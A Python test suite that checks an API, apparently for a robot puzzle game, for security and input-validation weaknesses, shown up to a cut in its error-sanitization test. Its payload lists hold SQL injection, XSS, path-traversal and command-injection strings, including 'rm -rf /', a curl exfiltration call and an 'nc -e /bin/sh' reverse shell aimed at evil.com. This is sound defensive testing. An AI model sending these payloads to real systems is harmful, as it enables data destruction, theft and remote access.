#!/usr/bin/env python3
"""
Data Validation and Edge Case Tests
Comprehensive tests for data validation, security, and edge cases across all API endpoints
"""

import asyncio
import json
import time
from datetime import datetime
from typing import Dict, List, Any
import aiohttp
import uuid
import random
import string

from test_base import TestSuite as BaseTestSuite, TestResult

class TestSuite:
    """Data Validation and Edge Case Test Suite"""
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.api_base_url = config.get('api_base_url', 'https://tdrzqioye7.execute-api.us-east-1.amazonaws.com/prod')
        self.suite = BaseTestSuite("Data Validation & Edge Cases", "Tests for data validation, security, and edge cases")
        
    async def run(self):
        """Run all data validation and edge case tests"""
        self.suite.start_time = datetime.now()
        
        print(f"📋 {self.suite.name}")
        if self.suite.description:
            print(f"   {self.suite.description}")
        print(f"   {'─' * 60}")
        
        # SQL injection and XSS tests
        await self.test_sql_injection_attempts()
        await self.test_xss_attempts()
        await self.test_path_traversal_attempts()
        await self.test_command_injection_attempts()
        
        # Data type and format validation
        await self.test_invalid_json_payloads()
        await self.test_null_and_undefined_values()
        await self.test_extremely_large_payloads()
        await self.test_invalid_date_formats()
        await self.test_invalid_numeric_formats()
        await self.test_unicode_and_encoding_issues()
        
        # HTTP protocol edge cases
        await self.test_invalid_http_headers()
        await self.test_unsupported_content_types()
        await self.test_invalid_authorization_formats()
        await self.test_request_timeout_behavior()
        await self.test_connection_limit_handling()
        
        # Business logic edge cases
        await self.test_boundary_value_analysis()
        await self.test_state_consistency_checks()
        await self.test_race_condition_scenarios()
        await self.test_resource_exhaustion_protection()
        
        # Security and privacy tests
        await self.test_information_disclosure()
        await self.test_error_message_sanitization()
        await self.test_session_management()
        await self.test_input_sanitization()
        
        self.suite.end_time = datetime.now()
        self._print_suite_summary()
        return self.suite
    
    def _print_test_result(self, result: TestResult):
        """Print individual test result"""
        status_icons = {'PASS': '✅', 'FAIL': '❌', 'ERROR': '💥', 'SKIP': '⏭️'}
        icon = status_icons.get(result.status, '❓')
        duration_str = f"({result.duration:.3f}s)" if result.duration > 0 else ""
        print(f"   {icon} {result.status:<6} {result.name:<50} {duration_str}")
        if result.message and self.config.get('verbose'):
            print(f"      💬 {result.message}")
        
    def _print_suite_summary(self):
        """Print test suite summary"""
        total = self.suite.total
        passed = self.suite.passed
        failed = self.suite.failed
        errors = self.suite.errors
        
        if total == 0:
            print(f"   ⚠️  No tests found")
            return
            
        success_rate = (passed / total) * 100 if total > 0 else 0
        print(f"   {'─' * 60}")
        print(f"   Summary: {total} tests, {passed} passed, {failed} failed, {errors} errors ({success_rate:.1f}% success rate)")
        print(f"   Duration: {self.suite.duration:.3f}s")
        print()

    async def _make_request(self, method: str, endpoint: str, headers: Dict = None, data: Dict = None, 
                           raw_body: str = None) -> tuple:
        """Make HTTP request and return (status, response, duration, response_headers)"""
        url = f"{self.api_base_url}{endpoint}"
        request_headers = {
            'Content-Type': 'application/json',
            'Origin': 'http://robot-puzzle-game-prod-website.s3-website-us-east-1.amazonaws.com'
        }
        if headers:
            request_headers.update(headers)
        
        start_time = time.time()
        
        try:
            async with aiohttp.ClientSession() as session:
                if raw_body is not None:
                    # Send raw body (for malformed JSON tests)
                    async with session.request(
                        method=method,
                        url=url,
                        headers=request_headers,
                        data=raw_body,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        duration = time.time() - start_time
                        
                        try:
                            response_data = await response.json()
                        except:
                            response_data = await response.text()
                        
                        return response.status, response_data, duration, dict(response.headers)
                else:
                    async with session.request(
                        method=method,
                        url=url,
                        headers=request_headers,
                        json=data,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        duration = time.time() - start_time
                        
                        try:
                            response_data = await response.json()
                        except:
                            response_data = await response.text()
                        
                        return response.status, response_data, duration, dict(response.headers)
                        
        except Exception as e:
            duration = time.time() - start_time
            return None, str(e), duration, {}

    def _create_mock_auth_header(self) -> Dict[str, str]:
        """Create a mock authorization header"""
        return {'Authorization': 'Bearer mock_token_for_testing'}

    async def test_sql_injection_attempts(self):
        """Test SQL injection prevention"""
        start_time = time.time()
        
        try:
            sql_payloads = [
                "'; DROP TABLE users; --",
                "' OR '1'='1",
                "'; INSERT INTO admin VALUES ('hacker', 'password'); --",
                "' UNION SELECT * FROM passwords --",
                "'; EXEC xp_cmdshell('dir'); --",
                "' OR 1=1 /*",
                "'; WAITFOR DELAY '00:00:10'; --"
            ]
            
            injection_blocked = 0
            headers = self._create_mock_auth_header()
            
            for payload in sql_payloads:
                # Test in various fields that might be vulnerable
                test_data = {
                    'name': payload,
                    'roundId': payload,
                    'username': payload
                }
                
                # Test against different endpoints
                endpoints = ['/configurations', '/rounds', '/scores']
                
                for endpoint in endpoints:
                    status, response, req_duration, resp_headers = await self._make_request('POST', endpoint, headers, test_data)
                    
                    # Should either reject with 400 (validation) or 401/403 (auth)
                    # Should NOT return 500 (which might indicate SQL error)
                    if status in [400, 401, 403]:
                        injection_blocked += 1
                    elif status == 500:
                        # 500 might indicate SQL injection vulnerability
                        break
            
            total_tests = len(sql_payloads) * len(endpoints)
            duration = time.time() - start_time
            
            if injection_blocked >= total_tests * 0.8:  # 80% should be blocked
                result = TestResult("test_sql_injection_attempts", "PASS", duration, 
                                  f"SQL injection attempts properly handled: {injection_blocked}/{total_tests}")
            else:
                result = TestResult("test_sql_injection_attempts", "FAIL", duration, 
                                  f"Potential SQL injection vulnerability: only {injection_blocked}/{total_tests} blocked")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_sql_injection_attempts", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_xss_attempts(self):
        """Test XSS prevention"""
        start_time = time.time()
        
        try:
            xss_payloads = [
                "<script>alert('xss')</script>",
                "<img src=x onerror=alert('xss')>",
                "javascript:alert('xss')",
                "<svg onload=alert('xss')>",
                "<iframe src=javascript:alert('xss')></iframe>",
                "';alert('xss');//",
                "<script>window.location='http://evil.com'</script>"
            ]
            
            xss_handled = 0
            headers = self._create_mock_auth_header()
            
            for payload in xss_payloads:
                test_data = {
                    'name': payload,
                    'description': payload,
                    'username': payload
                }
                
                # Test against endpoints that might display user input
                endpoints = ['/configurations', '/user-profiles']
                
                for endpoint in endpoints:
                    status, response, req_duration, resp_headers = await self._make_request('POST', endpoint, headers, test_data)
                    
                    # Check if response contains unsanitized XSS payload
                    if isinstance(response, str) and payload in response:
                        # Potential XSS vulnerability
                        pass
                    else:
                        xss_handled += 1
            
            total_tests = len(xss_payloads) * 2
            duration = time.time() - start_time
            
            if xss_handled >= total_tests * 0.8:
                result = TestResult("test_xss_attempts", "PASS", duration, 
                                  f"XSS attempts properly handled: {xss_handled}/{total_tests}")
            else:
                result = TestResult("test_xss_attempts", "FAIL", duration, 
                                  f"Potential XSS vulnerability: only {xss_handled}/{total_tests} handled")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_xss_attempts", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_path_traversal_attempts(self):
        """Test path traversal prevention"""
        start_time = time.time()
        
        try:
            path_payloads = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "/var/www/html/config.php",
                "../../../../../../etc/shadow"
            ]
            
            traversal_blocked = 0
            headers = self._create_mock_auth_header()
            
            for payload in path_payloads:
                # Test in URL paths
                status, response, req_duration, resp_headers = await self._make_request('GET', f'/configurations/{payload}', headers)
                
                # Should return 400 (bad request), 401/403 (auth), or 404 (not found)
                # Should NOT return file contents or 500 errors
                if status in [400, 401, 403, 404]:
                    traversal_blocked += 1
                elif isinstance(response, str) and ('root:' in response or 'password' in response.lower()):
                    # Potential path traversal vulnerability
                    break
            
            duration = time.time() - start_time
            if traversal_blocked == len(path_payloads):
                result = TestResult("test_path_traversal_attempts", "PASS", duration, 
                                  f"All {len(path_payloads)} path traversal attempts blocked")
            else:
                result = TestResult("test_path_traversal_attempts", "FAIL", duration, 
                                  f"Potential path traversal vulnerability: only {traversal_blocked}/{len(path_payloads)} blocked")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_path_traversal_attempts", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_command_injection_attempts(self):
        """Test command injection prevention"""
        start_time = time.time()
        
        try:
            command_payloads = [
                "; ls -la",
                "| cat /etc/passwd",
                "&& rm -rf /",
                "`whoami`",
                "$(ping -c 1 evil.com)",
                "; curl http://evil.com/steal-data",
                "| nc -e /bin/sh evil.com 4444"
            ]
            
            command_blocked = 0
            headers = self._create_mock_auth_header()
            
            for payload in command_payloads:
                test_data = {
                    'name': f"test{payload}",
                    'roundId': f"round{payload}",
                    'description': f"desc{payload}"
                }
                
                endpoints = ['/configurations', '/rounds']
                
                for endpoint in endpoints:
                    status, response, req_duration, resp_headers = await self._make_request('POST', endpoint, headers, test_data)
                    
                    # Should be rejected, not executed
                    if status in [400, 401, 403]:
                        command_blocked += 1
                    elif status == 500:
                        # 500 might indicate command execution error
                        break
            
            total_tests = len(command_payloads) * 2
            duration = time.time() - start_time
            
            if command_blocked >= total_tests * 0.8:
                result = TestResult("test_command_injection_attempts", "PASS", duration, 
                                  f"Command injection attempts properly handled: {command_blocked}/{total_tests}")
            else:
                result = TestResult("test_command_injection_attempts", "FAIL", duration, 
                                  f"Potential command injection vulnerability: only {command_blocked}/{total_tests} blocked")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_command_injection_attempts", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_invalid_json_payloads(self):
        """Test handling of malformed JSON"""
        start_time = time.time()
        
        try:
            invalid_json_payloads = [
                '{"name": "test",}',  # Trailing comma
                '{"name": "test" "description": "test"}',  # Missing comma
                '{"name": "test", "description": }',  # Missing value
                '{name: "test"}',  # Unquoted key
                '{"name": "test\n"}',  # Unescaped newline
                '{"name": "test", "number": 01}',  # Invalid number format
                '{"name": "test", "object": {}}',  # Incomplete object
                'not json at all'  # Not JSON
            ]
            
            proper_errors = 0
            headers = self._create_mock_auth_header()
            
            for payload in invalid_json_payloads:
                status, response, req_duration, resp_headers = await self._make_request('POST', '/configurations', headers, raw_body=payload)
                
                # Should return 400 Bad Request for malformed JSON
                if status == 400:
                    proper_errors += 1
            
            duration = time.time() - start_time
            if proper_errors >= len(invalid_json_payloads) * 0.8:
                result = TestResult("test_invalid_json_payloads", "PASS", duration, 
                                  f"Invalid JSON properly rejected: {proper_errors}/{len(invalid_json_payloads)}")
            else:
                result = TestResult("test_invalid_json_payloads", "FAIL", duration, 
                                  f"Poor JSON validation: only {proper_errors}/{len(invalid_json_payloads)} rejected")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_invalid_json_payloads", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_null_and_undefined_values(self):
        """Test handling of null and undefined values"""
        start_time = time.time()
        
        try:
            null_test_cases = [
                {'name': None, 'description': 'test'},
                {'name': 'test', 'walls': None},
                {'name': 'test', 'targets': None},
                {'roundId': None, 'moves': 10},
                {'roundId': 'test', 'moves': None},
                {'username': None},
                {}  # Empty object
            ]
            
            proper_handling = 0
            headers = self._create_mock_auth_header()
            
            endpoints = ['/configurations', '/rounds', '/scores', '/user-profiles']
            
            for test_case in null_test_cases:
                for endpoint in endpoints:
                    status, response, req_duration, resp_headers = await self._make_request('POST', endpoint, headers, test_case)
                    
                    # Should handle null values gracefully (400 validation error or 401/403 auth)
                    if status in [400, 401, 403]:
                        proper_handling += 1
                    elif status == 500:
                        # 500 might indicate poor null handling
                        break
            
            total_tests = len(null_test_cases) * len(endpoints)
            duration = time.time() - start_time
            
            if proper_handling >= total_tests * 0.7:
                result = TestResult("test_null_and_undefined_values", "PASS", duration, 
                                  f"Null values properly handled: {proper_handling}/{total_tests}")
            else:
                result = TestResult("test_null_and_undefined_values", "FAIL", duration, 
                                  f"Poor null value handling: only {proper_handling}/{total_tests} handled properly")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_null_and_undefined_values", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_extremely_large_payloads(self):
        """Test handling of extremely large payloads"""
        start_time = time.time()
        
        try:
            # Create various large payloads
            large_payloads = [
                {'name': 'A' * 100000},  # 100KB string
                {'description': 'B' * 1000000},  # 1MB string
                {'walls': [f'{i},{j},top' for i in range(1000) for j in range(10)]},  # Large array
                {'data': {'nested': {'very': {'deep': {'object': 'X' * 50000}}}}},  # Deep nesting
            ]
            
            proper_limits = 0
            headers = self._create_mock_auth_header()
            
            for payload in large_payloads:
                status, response, req_duration, resp_headers = await self._make_request('POST', '/configurations', headers, payload)
                
                # Should return 413 (Payload Too Large) or 400 (Bad Request)
                if status in [400, 401, 403, 413]:
                    proper_limits += 1
                elif req_duration > 30:  # Took too long
                    break
            
            duration = time.time() - start_time
            if proper_limits == len(large_payloads):
                result = TestResult("test_extremely_large_payloads", "PASS", duration, 
                                  f"All {len(large_payloads)} large payloads properly limited")
            else:
                result = TestResult("test_extremely_large_payloads", "FAIL", duration, 
                                  f"Inadequate payload size limits: only {proper_limits}/{len(large_payloads)} limited")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_extremely_large_payloads", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_invalid_date_formats(self):
        """Test handling of invalid date formats"""
        start_time = time.time()
        
        try:
            invalid_dates = [
                '2024-13-01T00:00:00Z',  # Invalid month
                '2024-02-30T00:00:00Z',  # Invalid day
                '2024-01-01T25:00:00Z',  # Invalid hour
                'not-a-date',
                '2024/01/01',  # Wrong format
                '2024-01-01',  # Missing time
                '1970-01-01T00:00:00',  # Missing timezone
                '9999-12-31T23:59:59Z'  # Far future
            ]
            
            proper_validation = 0
            headers = self._create_mock_auth_header()
            
            for date_str in invalid_dates:
                score_data = {
                    'roundId': 'test-round',
                    'moves': 10,
                    'completedAt': date_str
                }
                
                status, response, req_duration, resp_headers = await self._make_request('POST', '/scores', headers, score_data)
                
                # Should validate date format (400) or require auth (401/403)
                if status in [400, 401, 403]:
                    proper_validation += 1
            
            duration = time.time() - start_time
            if proper_validation >= len(invalid_dates) * 0.8:
                result = TestResult("test_invalid_date_formats", "PASS", duration, 
                                  f"Date validation working: {proper_validation}/{len(invalid_dates)} invalid dates rejected")
            else:
                result = TestResult("test_invalid_date_formats", "FAIL", duration, 
                                  f"Poor date validation: only {proper_validation}/{len(invalid_dates)} invalid dates rejected")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_invalid_date_formats", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_invalid_numeric_formats(self):
        """Test handling of invalid numeric formats"""
        start_time = time.time()
        
        try:
            invalid_numbers = [
                'not-a-number',
                'Infinity',
                '-Infinity',
                'NaN',
                '1.2.3',  # Multiple decimals
                '1e999',  # Too large
                '',  # Empty string
                '0x1F',  # Hexadecimal
                '007',  # Octal-like
            ]
            
            proper_validation = 0
            headers = self._create_mock_auth_header()
            
            for num_str in invalid_numbers:
                score_data = {
                    'roundId': 'test-round',
                    'moves': num_str,
                    'timeTaken': num_str
                }
                
                status, response, req_duration, resp_headers = await self._make_request('POST', '/scores', headers, score_data)
                
                # Should validate numeric format
                if status in [400, 401, 403]:
                    proper_validation += 1
            
            duration = time.time() - start_time
            if proper_validation >= len(invalid_numbers) * 0.8:
                result = TestResult("test_invalid_numeric_formats", "PASS", duration, 
                                  f"Numeric validation working: {proper_validation}/{len(invalid_numbers)} invalid numbers rejected")
            else:
                result = TestResult("test_invalid_numeric_formats", "FAIL", duration, 
                                  f"Poor numeric validation: only {proper_validation}/{len(invalid_numbers)} invalid numbers rejected")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_invalid_numeric_formats", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_unicode_and_encoding_issues(self):
        """Test handling of unicode and encoding edge cases"""
        start_time = time.time()
        
        try:
            unicode_test_cases = [
                '测试中文',  # Chinese characters
                '🎮🤖🚀',  # Emojis
                'café',  # Accented characters
                '\u0000\u0001\u0002',  # Control characters
                '\uffff',  # High unicode
                '\U0001F600',  # Unicode emoji
                'А' * 100,  # Cyrillic characters
                '𝕋𝕖𝕤𝕥',  # Mathematical symbols
            ]
            
            proper_handling = 0
            headers = self._create_mock_auth_header()
            
            for text in unicode_test_cases:
                test_data = {
                    'name': f'Test {text}',
                    'description': text
                }
                
                status, response, req_duration, resp_headers = await self._make_request('POST', '/configurations', headers, test_data)
                
                # Should handle unicode properly (not crash with 500)
                if status in [200, 201, 400, 401, 403]:
                    proper_handling += 1
            
            duration = time.time() - start_time
            if proper_handling == len(unicode_test_cases):
                result = TestResult("test_unicode_and_encoding_issues", "PASS", duration, 
                                  f"All {len(unicode_test_cases)} unicode cases handled properly")
            else:
                result = TestResult("test_unicode_and_encoding_issues", "FAIL", duration, 
                                  f"Unicode handling issues: only {proper_handling}/{len(unicode_test_cases)} handled properly")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_unicode_and_encoding_issues", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_invalid_http_headers(self):
        """Test handling of invalid HTTP headers"""
        start_time = time.time()
        
        try:
            invalid_headers_sets = [
                {'Content-Type': 'invalid/type'},
                {'Content-Length': '-1'},
                {'Authorization': 'InvalidFormat'},
                {'Accept': 'application/xml'},  # Unsupported accept type
                {'X-Forwarded-For': '999.999.999.999'},  # Invalid IP
                {'User-Agent': 'A' * 10000},  # Extremely long user agent
                {'Origin': 'javascript:alert("xss")'},  # Malicious origin
            ]
            
            proper_handling = 0
            
            for headers in invalid_headers_sets:
                status, response, req_duration, resp_headers = await self._make_request('GET', '/configurations', headers)
                
                # Should handle invalid headers gracefully
                if status in [400, 401, 403, 406]:  # 406 = Not Acceptable
                    proper_handling += 1
                elif status == 500:
                    # 500 indicates poor header handling
                    break
            
            duration = time.time() - start_time
            if proper_handling >= len(invalid_headers_sets) * 0.7:
                result = TestResult("test_invalid_http_headers", "PASS", duration, 
                                  f"Invalid headers handled: {proper_handling}/{len(invalid_headers_sets)}")
            else:
                result = TestResult("test_invalid_http_headers", "FAIL", duration, 
                                  f"Poor header handling: only {proper_handling}/{len(invalid_headers_sets)} handled properly")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_invalid_http_headers", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_unsupported_content_types(self):
        """Test handling of unsupported content types"""
        start_time = time.time()
        
        try:
            unsupported_types = [
                'text/xml',
                'application/x-www-form-urlencoded',
                'multipart/form-data',
                'text/plain',
                'application/octet-stream',
                'image/jpeg',
                'video/mp4'
            ]
            
            proper_rejection = 0
            
            for content_type in unsupported_types:
                headers = {
                    'Content-Type': content_type,
                    'Authorization': 'Bearer mock_token'
                }
                
                status, response, req_duration, resp_headers = await self._make_request('POST', '/configurations', headers, raw_body='test data')
                
                # Should reject unsupported content types with 415
                if status in [400, 401, 403, 415]:  # 415 = Unsupported Media Type
                    proper_rejection += 1
            
            duration = time.time() - start_time
            if proper_rejection >= len(unsupported_types) * 0.8:
                result = TestResult("test_unsupported_content_types", "PASS", duration, 
                                  f"Unsupported content types rejected: {proper_rejection}/{len(unsupported_types)}")
            else:
                result = TestResult("test_unsupported_content_types", "FAIL", duration, 
                                  f"Poor content type validation: only {proper_rejection}/{len(unsupported_types)} rejected")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_unsupported_content_types", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_invalid_authorization_formats(self):
        """Test handling of invalid authorization formats"""
        start_time = time.time()
        
        try:
            invalid_auth_headers = [
                'Bearer',  # Missing token
                'Basic invalid',  # Wrong auth type
                'Bearer ' + 'x' * 10000,  # Extremely long token
                'Bearer token with spaces',  # Invalid token format
                'Custom invalid-format',  # Custom auth scheme
                '',  # Empty authorization
                'Bearer 123',  # Too short token
            ]
            
            proper_rejection = 0
            
            for auth_header in invalid_auth_headers:
                headers = {'Authorization': auth_header}
                status, response, req_duration, resp_headers = await self._make_request('GET', '/configurations', headers)
                
                # Should reject invalid auth with 401
                if status in [401, 403]:
                    proper_rejection += 1
            
            duration = time.time() - start_time
            if proper_rejection == len(invalid_auth_headers):
                result = TestResult("test_invalid_authorization_formats", "PASS", duration, 
                                  f"All {len(invalid_auth_headers)} invalid auth formats rejected")
            else:
                result = TestResult("test_invalid_authorization_formats", "FAIL", duration, 
                                  f"Poor auth validation: only {proper_rejection}/{len(invalid_auth_headers)} rejected")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_invalid_authorization_formats", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_request_timeout_behavior(self):
        """Test request timeout handling"""
        start_time = time.time()
        
        try:
            # Test with very short timeout
            timeout_handled = False
            headers = self._create_mock_auth_header()
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.request(
                        method='GET',
                        url=f"{self.api_base_url}/configurations",
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=0.001)  # 1ms timeout
                    ) as response:
                        pass
            except asyncio.TimeoutError:
                timeout_handled = True
            except Exception:
                timeout_handled = True  # Any timeout-related exception
            
            duration = time.time() - start_time
            if timeout_handled:
                result = TestResult("test_request_timeout_behavior", "PASS", duration, 
                                  "Request timeout handled gracefully")
            else:
                result = TestResult("test_request_timeout_behavior", "SKIP", duration, 
                                  "Timeout not triggered (server too fast)")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_request_timeout_behavior", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_connection_limit_handling(self):
        """Test connection limit and concurrent request handling"""
        start_time = time.time()
        
        try:
            # Send many concurrent requests
            headers = self._create_mock_auth_header()
            tasks = []
            
            for i in range(20):  # 20 concurrent requests
                task = self._make_request('GET', '/configurations', headers)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # All should respond (not hang or crash)
            successful_responses = 0
            for result in results:
                if isinstance(result, tuple) and result[0] is not None:
                    successful_responses += 1
            
            duration = time.time() - start_time
            if successful_responses >= 15:  # At least 75% should respond
                result = TestResult("test_connection_limit_handling", "PASS", duration, 
                                  f"Concurrent requests handled: {successful_responses}/20 responded")
            else:
                result = TestResult("test_connection_limit_handling", "FAIL", duration, 
                                  f"Poor concurrent handling: only {successful_responses}/20 responded")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_connection_limit_handling", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_boundary_value_analysis(self):
        """Test boundary values for numeric inputs"""
        start_time = time.time()
        
        try:
            boundary_values = [
                -1, 0, 1,  # Around zero
                2147483647, 2147483648,  # 32-bit integer limits
                -2147483648, -2147483649,
                9223372036854775807,  # 64-bit integer limit
                float('inf'), float('-inf'),  # Infinity
                1.7976931348623157e+308,  # Max float
            ]
            
            proper_handling = 0
            headers = self._create_mock_auth_header()
            
            for value in boundary_values:
                score_data = {
                    'roundId': 'boundary-test',
                    'moves': value,
                    'timeTaken': value
                }
                
                try:
                    status, response, req_duration, resp_headers = await self._make_request('POST', '/scores', headers, score_data)
                    
                    # Should handle boundary values gracefully
                    if status in [200, 201, 400, 401, 403]:
                        proper_handling += 1
                except:
                    # Exception in handling boundary values
                    pass
            
            duration = time.time() - start_time
            if proper_handling >= len(boundary_values) * 0.8:
                result = TestResult("test_boundary_value_analysis", "PASS", duration, 
                                  f"Boundary values handled: {proper_handling}/{len(boundary_values)}")
            else:
                result = TestResult("test_boundary_value_analysis", "FAIL", duration, 
                                  f"Poor boundary handling: only {proper_handling}/{len(boundary_values)} handled properly")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_boundary_value_analysis", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_state_consistency_checks(self):
        """Test state consistency across operations"""
        start_time = time.time()
        
        try:
            headers = self._create_mock_auth_header()
            
            # Try to create then immediately access
            config_data = {
                'name': 'Consistency Test',
                'walls': ['1,1,top'],
                'targets': ['2,2']
            }
            
            # Create
            status1, response1, duration1, headers1 = await self._make_request('POST', '/configurations', headers, config_data)
            
            # Immediately try to access (if creation was successful)
            if status1 == 201 and isinstance(response1, dict) and 'configId' in response1:
                config_id = response1['configId']
                status2, response2, duration2, headers2 = await self._make_request('GET', f'/configurations/{config_id}', headers)
                
                consistency_check = status2 == 200
            else:
                # Test state consistency by trying operations in sequence
                status2, response2, duration2, headers2 = await self._make_request('GET', '/configurations', headers)
                consistency_check = status1 in [401, 403] and status2 in [401, 403]  # Consistent auth behavior
            
            duration = time.time() - start_time
            if consistency_check:
                result = TestResult("test_state_consistency_checks", "PASS", duration, 
                                  "State consistency maintained across operations")
            else:
                result = TestResult("test_state_consistency_checks", "FAIL", duration, 
                                  f"State inconsistency detected: create={status1}, read={status2}")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_state_consistency_checks", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_race_condition_scenarios(self):
        """Test race condition handling"""
        start_time = time.time()
        
        try:
            headers = self._create_mock_auth_header()
            
            # Simulate race condition by sending identical requests simultaneously
            config_data = {
                'name': f'Race Test {uuid.uuid4().hex[:8]}',
                'walls': ['1,1,top'],
                'targets': ['2,2']
            }
            
            # Send same request multiple times simultaneously
            tasks = []
            for i in range(5):
                task = self._make_request('POST', '/configurations', headers, config_data)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Analyze results for race condition handling
            status_codes = []
            for result in results:
                if isinstance(result, tuple) and result[0] is not None:
                    status_codes.append(result[0])
            
            # Should handle race conditions gracefully (consistent responses)
            unique_statuses = set(status_codes)
            race_handled = len(unique_statuses) <= 2  # Should be mostly consistent
            
            duration = time.time() - start_time
            if race_handled:
                result = TestResult("test_race_condition_scenarios", "PASS", duration, 
                                  f"Race conditions handled: {len(status_codes)} requests, {len(unique_statuses)} unique statuses")
            else:
                result = TestResult("test_race_condition_scenarios", "FAIL", duration, 
                                  f"Potential race condition issues: {len(unique_statuses)} different statuses from {len(status_codes)} requests")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_race_condition_scenarios", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_resource_exhaustion_protection(self):
        """Test protection against resource exhaustion"""
        start_time = time.time()
        
        try:
            headers = self._create_mock_auth_header()
            
            # Send many requests quickly to test rate limiting
            request_count = 50
            tasks = []
            
            for i in range(request_count):
                task = self._make_request('GET', '/configurations', headers)
                tasks.append(task)
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Check for rate limiting responses
            rate_limited = 0
            server_errors = 0
            
            for result in results:
                if isinstance(result, tuple) and result[0] is not None:
                    if result[0] == 429:  # Too Many Requests
                        rate_limited += 1
                    elif result[0] >= 500:
                        server_errors += 1
            
            duration = time.time() - start_time
            
            # Should either rate limit or handle all requests without server errors
            if rate_limited > 0:
                result = TestResult("test_resource_exhaustion_protection", "PASS", duration, 
                                  f"Rate limiting active: {rate_limited}/{request_count} requests rate limited")
            elif server_errors == 0:
                result = TestResult("test_resource_exhaustion_protection", "PASS", duration, 
                                  f"Resource exhaustion handled: {request_count} requests without server errors")
            else:
                result = TestResult("test_resource_exhaustion_protection", "FAIL", duration, 
                                  f"Resource exhaustion issues: {server_errors} server errors out of {request_count} requests")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_resource_exhaustion_protection", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities"""
        start_time = time.time()
        
        try:
            sensitive_info_checks = 0
            headers = self._create_mock_auth_header()
            
            # Test error messages for information disclosure
            endpoints = ['/configurations/nonexistent', '/rounds/invalid', '/scores/missing']
            
            for endpoint in endpoints:
                status, response, req_duration, resp_headers = await self._make_request('GET', endpoint, headers)
                
                if isinstance(response, str):
                    # Check for sensitive information in error messages
                    sensitive_patterns = [
                        'database', 'sql', 'connection', 'password',
                        'internal server', 'stack trace', 'exception',
                        'file not found', 'permission denied'
                    ]
                    
                    has_sensitive_info = any(pattern in response.lower() for pattern in sensitive_patterns)
                    
                    if not has_sensitive_info:
                        sensitive_info_checks += 1
                else:
                    # Non-string responses are generally safe
                    sensitive_info_checks += 1
            
            duration = time.time() - start_time
            if sensitive_info_checks == len(endpoints):
                result = TestResult("test_information_disclosure", "PASS", duration, 
                                  f"No sensitive information disclosed in {len(endpoints)} error responses")
            else:
                result = TestResult("test_information_disclosure", "FAIL", duration, 
                                  f"Potential information disclosure: {len(endpoints) - sensitive_info_checks}/{len(endpoints)} responses may contain sensitive info")
            
        except Exception as e:
            duration = time.time() - start_time
            result = TestResult("test_information_disclosure", "ERROR", duration, str(e))
        
        self.suite.tests.append(result)
        self._print_test_result(result)

    async def test_error_message_sanitization(self):
        """Test error message sanitization"""
        start_time = time.time()
        
        try:
            malicious_inputs = [
                '<script>alert("xss")</script>',
                '"; DROP TABLE users; --',
                '../../../etc/passwd',
                '${7*7}',  # Expression injection
                '{{7*7}}',  # Template injection
            ]
            
            sanitized_responses = 0
            headers = self._create_mock_auth_header()
            
            for malicious_input in malicious_inputs:
